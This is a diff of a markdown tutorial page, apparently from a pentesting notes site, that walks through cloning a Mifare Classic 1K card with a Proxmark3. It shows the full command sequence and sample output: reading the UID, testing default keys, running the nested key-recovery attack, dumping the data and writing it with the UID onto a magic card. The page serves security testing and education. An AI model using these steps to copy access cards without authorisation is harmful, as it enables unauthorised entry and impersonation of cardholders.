@@ -5,17 +5,17 @@ template: comments.html
 tags: [pt, tools, rfid]
 ---
 
-# Mifare Classic 1K ISO14443A
+# Clone Mifare Classic 1K ISO14443A
 
-## How to clone Mifare Classic 1K ISO14443A NFC Tag
+## Read Mifare ISO14443A Basic Information
 
-```bash
+```shell
 proxmark3> hf search
 ```
 
 Which results in a response along the lines of:
 
-```bash
+```shell
  #db# DownloadFPGA(len: 42096)
  UID : de 0f 3d cd
 ATQA : 00 04
@@ -31,15 +31,17 @@ As we can see the output `ISO14443A Tag Found` it's `Mifare 1k` card.
 
 This also shows us the UID `de0f3dcd` of the card, which we’ll need later.
 
+## Find and Extract the 32 Keys From The Mifare ISO14443A
+
 From there we can find keys in use by checking against a list of default keys (hopefully one of these has been used)
 
-```bash
+```shell
 proxmark3> hf mf chk * ?
 ```
 
 This should show us the key we require looking something like
 
-```bash
+```shell hl_lines="16 19"
 No key specified, trying default keys
 chk default key[ 0] ffffffffffff
 chk default key[ 1] 000000000000
@@ -61,18 +63,53 @@ Found valid key:[ffffffffffff]
 Found valid key:[ffffffffffff]
 ```
 
+If you see ==Found valid key==:[ffffffffffff]
+
 This shows a key of `ffffffffffff`, which we can plug into the next command, which dumps keys to file `dumpkeys.bin`.
 
-```bash
+```shell
 proxmark3> hf mf nested 1 0 A ffffffffffff d
 ```
 
-Now to dump the contents of the card.  
+If you see see an a table like this in output without `valid key`
+
+```shell
+|---|----------------|---|----------------|---|
+|sec|key A           |res|key B           |res|
+|---|----------------|---|----------------|---|
+|000|  a0a1a2a3a4a5  | 1 |  ffffffffffff  | 0 |
+|001|  ffffffffffff  | 0 |  ffffffffffff  | 0 |
+|002|  a0a1a2a3a4a5  | 1 |  ffffffffffff  | 0 |
+|003|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
+|004|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
+|005|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
+|006|  ffffffffffff  | 1 |  ffffffffffff  | 0 |
+|007|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
+|008|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
+|009|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
+|010|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
+|011|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
+|012|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
+|013|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
+|014|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
+|015|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
+|---|----------------|---|----------------|---|
+```
+
+In this case use `002` key like this
+
+```shell
+proxmark3> hf mf nested 1 0 A a0a1a2a3a4a5 d
+```
+
+Now you should be able to dump the contents of the 32 keys from the original card.
 This dumps data from the card into `dumpdata.bin`
 
-```bash
+```shell
 proxmark3> hf mf dump
 ```
+
+## Clone Mifare ISO14443A Using The Dumped Keys
 
 At this point we’ve got everything we need from the card, we can take it off the reader.
 
@@ -80,14 +117,26 @@ To copy that data onto a new card, place the [(Chinese backdoor) card](https://a
 
 This restores the dumped data onto the new card. Now we just need to give the card the UID we got from the original hf search command
 
-```bash
+```shell
 proxmark3> hf mf restore 1
 ```
 
 Copy the UID of the original card `de0f3dcd`
 
-```bash
+```shell
 proxmark3> hf mf csetuid de0f3dcd
 ```
 
 We’re done.
+
+<!-- appendices -->
+
+<!-- urls -->
+
+[common-keys]: /assets/pages/proxmark/commonkeys.txt 'common-keys'
+
+<!-- images -->
+
+<!--css-->
+
+<!-- end appendices -->
